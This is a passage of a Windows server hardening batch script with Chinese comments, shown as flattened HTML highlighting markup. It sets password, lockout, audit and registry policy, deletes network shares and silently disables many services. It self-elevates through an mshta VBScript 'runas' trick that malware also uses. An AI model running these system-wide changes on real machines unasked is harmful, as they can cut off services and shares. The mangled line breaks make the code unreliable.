06:: 权限代码<span class="token operator">%</span>1 mshta vbscript:CreateObject<span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span>1<span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span> &amp;&amp; <span class="token keyword">exit</span><span class="token function">echo</span> <span class="token namespace">[Unicode]</span>>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> Unicode=yes>>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> <span class="token namespace">[Version]</span>>>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> signature=<span class="token string">"<span class="token variable">$CHICAGO</span>$"</span>>>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> Revision=1 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> <span class="token namespace">[System Access]</span>>>win<span class="token punctuation">.</span>inf<span class="token keyword">for</span> <span class="token operator">/</span>f <span class="token string">"delims="</span> <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span><span class="token string">'type "win.ini"^| find /i "="'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token function">set</span> <span class="token operator">%</span><span class="token operator">%</span>i@rem 账户设置：@rem 更改管理员账户名称为admin<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 更改管理员帐户名称为<span class="token operator">%</span>admin_name<span class="token operator">%</span><span class="token function">echo</span> NewAdministratorName = <span class="token string">"%admin_name%"</span> >>win<span class="token punctuation">.</span>inf@rem 启用密码复杂度策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 启用密码复杂度策略<span class="token function">echo</span> PasswordComplexity = 1 >>win<span class="token punctuation">.</span>inf@rem 配置密码长度最小值为minlen<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置密码长度最小值为<span class="token operator">%</span>minlen<span class="token operator">%</span><span class="token function">echo</span> MinimumPasswordLength = <span class="token operator">%</span>minlen<span class="token operator">%</span> >>win<span class="token punctuation">.</span>inf@rem 配置“强制密码历史”<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 记住<span class="token operator">%</span>remember<span class="token operator">%</span>次已使用的密码<span class="token function">echo</span> PasswordHistorySize = <span class="token operator">%</span>remember<span class="token operator">%</span> >>win<span class="token punctuation">.</span>inf@rem 配置密码最长使用期限（可选<span class="token punctuation">,</span>缺省不配置）<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 设置180天更改密码（可选）<span class="token function">echo</span> MaximumPasswordAge = <span class="token operator">%</span>PASS_MAX_DAYS<span class="token operator">%</span> >>win<span class="token punctuation">.</span>inf@rem 配置密码最短使用期限（可选<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 设置0天更改密码（可选）<span class="token function">echo</span> MinimumPasswordAge = <span class="token operator">%</span>PASS_MIN_DAYS<span class="token operator">%</span> >>win<span class="token punctuation">.</span>inf@rem 配置帐户锁定阈值为deny<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置帐户锁定阈值为deny<span class="token function">echo</span> LockoutBadCount = <span class="token operator">%</span>deny<span class="token operator">%</span>>>win<span class="token punctuation">.</span>inf@rem 配置帐户锁定时间<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 设置帐户锁定时间为5分钟<span class="token function">echo</span> LockoutDuration = 5 >>win<span class="token punctuation">.</span>inf@rem 配置“复位帐户锁定计数器”时间<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 5分钟后重置帐户锁定计数器<span class="token function">echo</span> ResetLockoutCount = 5 >>win<span class="token punctuation">.</span>inf@rem 删除或禁用高危账户<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 禁用Guest用户<span class="token function">echo</span> EnableGuestAccount = 0 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=<span class="token function">echo</span> <span class="token namespace">[Event Audit]</span>>>win<span class="token punctuation">.</span>inf@rem 配置日志审核策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置日志审核策略<span class="token function">echo</span> AuditSystemEvents = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditLogonEvents = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditObjectAccess = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditPrivilegeUse = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditPolicyChange = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditAccountManage = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditProcessTracking = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditDSAccess = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span> AuditAccountLogon = 3 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=@rem 正确配置Windows日志<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 正确配置Windows日志（当日志文件大于128M时按需覆盖事件）reg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\System"</span> <span class="token operator">/</span>v MaxSize <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x8000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\System"</span> <span class="token operator">/</span>v Retention <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Application"</span> <span class="token operator">/</span>v MaxSize <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x8000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Application"</span> <span class="token operator">/</span>v Retention <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"</span> <span class="token operator">/</span>v MaxSize <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x8000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"</span> <span class="token operator">/</span>v Retention <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>f<span class="token function">echo</span>=<span class="token function">echo</span> <span class="token namespace">[Privilege Rights]</span>>>win<span class="token punctuation">.</span>inf@rem 限制可关闭系统的帐户和组<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置仅“Administrators”用户组可关闭系统<span class="token function">echo</span> SeShutdownPrivilege = <span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>544 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=@rem 限制可从远端关闭系统的帐户和组<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置仅“Administrators”用户组可从远端关闭系统<span class="token function">echo</span> SeRemoteShutdownPrivilege = <span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>544 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=@rem 限制“取得文件或其它对象的所有权”的帐户和组<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置仅“Administrators”用户组可取得文件或其它对象的所有权<span class="token function">echo</span> SeTakeOwnershipPrivilege = <span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>544 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=@rem 配置“允许本地登录”策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置仅“Administrators”和“Users”用户组可本地登录<span class="token function">echo</span> SeInteractiveLogonRight = <span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>544<span class="token punctuation">,</span><span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>545 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=@rem 配置“从网络访问此计算机”策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置仅“Administrators”和“Users”用户组可从网络访问此计算机<span class="token function">echo</span> SeNetworkLogonRight = <span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>544<span class="token punctuation">,</span><span class="token operator">*</span>S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>32<span class="token operator">-</span>545 >>win<span class="token punctuation">.</span>inf<span class="token function">echo</span>=@rem 删除可匿名访问的共享和命名管道<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 将“网络访问: 可匿名访问的共享”、“网络访问: 可匿名访问的命名管道”<span class="token punctuation">,</span>配置为空reg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters"</span> <span class="token operator">/</span>v NullSessionShares <span class="token operator">/</span>t REG_MULTI_SZ <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters"</span> <span class="token operator">/</span>v NullSessionPipes <span class="token operator">/</span>t REG_MULTI_SZ <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 限制匿名用户连接<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 将“网络访问: 不允许 SAM 帐户和共享的匿名枚举”、“网络访问: 不允许 SAM 帐户的匿名枚举”<span class="token punctuation">,</span>配置为“启用”reg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"</span> <span class="token operator">/</span>v restrictanonymoussam <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"</span> <span class="token operator">/</span>v restrictanonymous <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 更改SNMP服务的默认public团体（需先安装SNMP服务<span class="token punctuation">,</span>自定义password、IP）<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 修改SNMP团体字为：SNMP_password<span class="token punctuation">,</span>指定管理端SNMP_IPreg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"</span> <span class="token operator">/</span>v <span class="token operator">%</span>SNMP_password<span class="token operator">%</span> <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000004 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\PermittedManagers"</span> <span class="token operator">/</span>v 1 <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>SNMP_ip<span class="token operator">%</span> <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 关闭Windows自动播放<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 启用“关闭自动播放策略”且对所有驱动器生效reg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"</span> <span class="token operator">/</span>v NoDriveTypeAutoRun <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x000000ff <span class="token operator">/</span>freg add <span class="token string">"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"</span> <span class="token operator">/</span>v NoDriveTypeAutoRun <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x000000ff <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 禁止Windows自动登录<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 禁止Windows自动登录reg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span> <span class="token operator">/</span>v AutoAdminLogon <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 正确配置“锁定会话时显示用户信息”策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置锁定会话时不显示用户信息reg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> <span class="token operator">/</span>v DontDisplayLockedUserId <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000003 <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 正确配置“提示用户在密码过期之前进行更改”策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置在密码过期前14天提示更改密码reg add <span class="token string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"</span> <span class="token operator">/</span>v PasswordExpiryWarning <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x0000000e <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 禁用Windows磁盘默认共享<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 删除并禁用Windows磁盘默认共享<span class="token keyword">for</span> <span class="token operator">/</span>f <span class="token string">"tokens=1 delims= "</span> <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span><span class="token string">'net share'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>net share <span class="token operator">%</span><span class="token operator">%</span>i <span class="token operator">/</span><span class="token function">del</span> <span class="token punctuation">)</span> >nul 2>nulreg add <span class="token string">"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters"</span> <span class="token operator">/</span>v AutoShareServer <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters"</span> <span class="token operator">/</span>v AutoShareWks <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 共享文件夹的权限设置（供运维人员参考）<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 将共享文件夹中“Everyone<span class="token punctuation">(</span>任何人<span class="token punctuation">)</span>”权限删掉<span class="token keyword">for</span> <span class="token operator">/</span>f <span class="token string">"tokens=2"</span> <span class="token operator">%</span><span class="token operator">%</span>i in <span class="token punctuation">(</span><span class="token string">'net share'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token punctuation">(</span>cacls <span class="token operator">%</span><span class="token operator">%</span>i <span class="token operator">/</span>r <span class="token string">"everyone"</span> <span class="token operator">/</span>e <span class="token punctuation">)</span> >nul 2>nul<span class="token function">echo</span>=@rem 启用Windows数据执行保护<span class="token punctuation">(</span>DEP<span class="token punctuation">)</span><span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 设置仅为基本Windows程序和服务启用DEP@rem Server 2008:bcdedit <span class="token operator">/</span><span class="token function">set</span> nx OptIn@rem Server 2003:@rem <span class="token operator">/</span>noexecute=optin<span class="token function">echo</span>=@rem 启用“不显示最后用户名”策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 配置登录屏幕上不要显示上次登录的用户名reg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System"</span> <span class="token operator">/</span>v DontDisplayLastUserName <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 启用并正确配置WSUS（自定义WSUS地址）<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 启用并正确配置WSUS（自动下载并通知安装）reg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"</span> <span class="token operator">/</span>v AUOptions <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000003 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"</span> <span class="token operator">/</span>v NoAutoRebootWithLoggedOnUsers <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"</span> <span class="token operator">/</span>v NoAutoUpdate <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"</span> <span class="token operator">/</span>v ScheduledInstallDay <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"</span> <span class="token operator">/</span>v ScheduledInstallTime <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000003 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"</span> <span class="token operator">/</span>v UseWUServer <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"</span> <span class="token operator">/</span>v WUServer <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>WSUS_ip<span class="token operator">%</span> <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"</span> <span class="token operator">/</span>v WUStatusServer <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>WSUS_ip<span class="token operator">%</span> <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 启用并正确配置NTP（自定义NTP地址）reg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\W32Time\Parameters"</span> <span class="token operator">/</span>v NtpServer <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>NTP_ip<span class="token operator">%</span><span class="token punctuation">,</span>0x9 <span class="token operator">/</span>fw32tm <span class="token operator">/</span>config <span class="token operator">/</span>manualpeerlist:<span class="token string">"%NTP_ip%"</span> <span class="token operator">/</span>syncfromflags:manual <span class="token operator">/</span>updatereg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\W32Time\TimeProviders\NtpServer"</span> <span class="token operator">/</span>v Enabled <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\W32Time\Config"</span> <span class="token operator">/</span>v AnnounceFlags <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000005 <span class="token operator">/</span>f<span class="token function">sc</span> config <span class="token string">"W32Time"</span> <span class="token function">start</span>= delayed<span class="token operator">-</span>auto >nul 2>nulnetsh firewall add portopening protocol = UDP port =123 name = NTPSERVER >nul 2>nulnet <span class="token function">start</span> w32time >nul 2>nul <span class="token punctuation">|</span><span class="token punctuation">|</span> net stop w32time >nul 2>nul &amp;&amp; net <span class="token function">start</span> w32time >nul 2>nul &amp;&amp; w32tm <span class="token operator">/</span>resync >nul 2>nulw32tm <span class="token operator">/</span>resync >nul 2>nul<span class="token function">echo</span>=@rem 启用并正确配置屏幕保护程序<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 启用屏幕保护程序<span class="token punctuation">,</span>等待时间为10分钟<span class="token punctuation">,</span>并设置在恢复时需要密码保护reg add <span class="token string">"HKEY_CURRENT_USER\Control Panel\Desktop"</span> <span class="token operator">/</span>v SCRNSAVE<span class="token punctuation">.</span>EXE <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d C:\Windows\system32\scrnsave<span class="token punctuation">.</span>scr <span class="token operator">/</span>freg add <span class="token string">"HKEY_CURRENT_USER\Control Panel\Desktop"</span> <span class="token operator">/</span>v ScreenSaverIsSecure <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d 1 <span class="token operator">/</span>freg add <span class="token string">"HKEY_CURRENT_USER\Control Panel\Desktop"</span> <span class="token operator">/</span>v ScreenSaveTimeOut <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>TMOUT<span class="token operator">%</span> <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 禁用“登录时无须按 Ctrl<span class="token operator">+</span>Alt<span class="token operator">+</span><span class="token function">Del</span>”策略<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> “交互式登录: 无须<span class="token punctuation">(</span>不需要<span class="token punctuation">)</span>按 Ctrl<span class="token operator">+</span>Alt<span class="token operator">+</span><span class="token function">Del</span>”<span class="token punctuation">,</span>配置为“已禁用<span class="token punctuation">(</span>停用<span class="token punctuation">)</span>”reg add <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Currentversion\Policies\System"</span> <span class="token operator">/</span>v disablecad <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>f<span class="token function">echo</span>=@rem 禁用不必要的服务<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 禁用以下服务：Windows Internet Name Service <span class="token punctuation">(</span>WINS<span class="token punctuation">)</span>、Remote Access Connection Manager、Simple TCP<span class="token operator">/</span>IP Services、Simple Mail Transport Protocol <span class="token punctuation">(</span>SMTP<span class="token punctuation">)</span> 、DHCP Client、DHCP Server、Message Queuingwmic service where name=<span class="token string">"SimpTcp"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"SimpTcp"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"SMTPSVC"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"SMTPSVC"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"WINS"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"WINS"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"RasMan"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"RasMan"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"DHCPServer"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"DHCPServer"</span> <span class="token function">start</span>= disabled >nul 2>nul@rem 禁用DHCP Client（取消注释即可生效）@rem wmic service where name=<span class="token string">"DHCP"</span> call stopservice >nul 2>nul@rem <span class="token function">sc</span> config <span class="token string">"DHCP"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"MSMQ"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"MSMQ"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"BITS"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"BITS"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"Browser"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"Browser"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"DPS"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"DPS"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"iphlpsvc"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"iphlpsvc"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"Spooler"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"Spooler"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"RemoteRegistry"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"RemoteRegistry"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"LanmanServer"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"LanmanServer"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"WinRM"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"WinRM"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"FontCache"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"FontCache"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"WinHttpAutoProxySvc"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"WinHttpAutoProxySvc"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"WerSvc"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"WerSvc"</span> <span class="token function">start</span>= disabled >nul 2>nulwmic service where name=<span class="token string">"lmhosts"</span> call stopservice >nul 2>nul<span class="token function">sc</span> config <span class="token string">"lmhosts"</span> <span class="token function">start</span>= disabled >nul 2>nul<span class="token function">echo</span>=@rem 安装最新补丁包和补丁<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 检测是否安装补丁wmic qfe get hotfixid >nul 2>nul <span class="token punctuation">|</span><span class="token punctuation">|</span> <span class="token function">echo</span> 尚未安装补丁<span class="token punctuation">,</span>请安装！<span class="token function">echo</span>=@rem 配置“用户下次登录时需更改密码”<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 设置administrator（admin）用户下次登录必须更改密码net user Administrator <span class="token operator">/</span>logonpasswordchg:yes >nul 2>nulnet user <span class="token operator">%</span>admin_name<span class="token operator">%</span> <span class="token operator">/</span>logonpasswordchg:yes >nul 2>nul<span class="token function">echo</span>=<span class="token function">echo</span> <span class="token namespace">[Registry Values]</span>>>win<span class="token punctuation">.</span>inf@rem 禁用未登录前关机权限<span class="token function">echo</span> <span class="token operator">*</span>*<span class="token operator">*</span><span class="token operator">*</span> 允许未登录前关机选项设置为禁用reg add <span class="token string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span> <span class="token operator">/</span>v ShutdownWithoutLogon <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000000 <span class="token operator">/</span>f@rem 设置用户登录时显示的标题和信息reg add <span class="token string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span> <span class="token operator">/</span>v LegalNoticeCaption  <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>Title<span class="token operator">%</span> <span class="token operator">/</span>freg add <span class="token string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span> <span class="token operator">/</span>v LegalNoticeText <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token operator">%</span>Content<span class="token operator">%</span> <span class="token operator">/</span>f@rem 限制远程登录空闲断开时间（默认15分钟）reg add <span class="token string">"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters"</span> <span class="token operator">/</span>v AutoDisconnect <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x0000000f <span class="token operator">/</span>f@rem 空密码的本地账户只允许进行控制台登录reg add <span class="token string">"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa"</span> <span class="token operator">/</span>v LimitBlankPasswordUse <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0x00000001 <span class="token operator">/</span>fsecedit <span class="token operator">/</span>configure <span class="token operator">/</span>db win<span class="token punctuation">.</span>sdb <span class="token operator">/</span>cfg win<span class="token punctuation">.</span>inf<span class="token function">del</span> win<span class="token 